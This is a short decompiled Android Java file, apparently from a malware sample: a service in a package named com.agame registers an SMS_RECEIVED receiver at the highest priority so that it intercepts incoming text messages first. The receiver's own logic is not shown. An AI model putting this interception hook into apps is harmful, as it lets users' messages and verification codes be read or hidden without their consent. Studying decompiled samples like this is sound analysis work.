// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class TMyService extends Service {
    private TRecevier smsReceiver;

    public TMyService() {
        super();
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        intentFilter.setPriority(Integer.MAX_VALUE);
        this.smsReceiver = new TRecevier();
        this.registerReceiver(this.smsReceiver, intentFilter);
    }

    public void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(this.smsReceiver);
    }
}

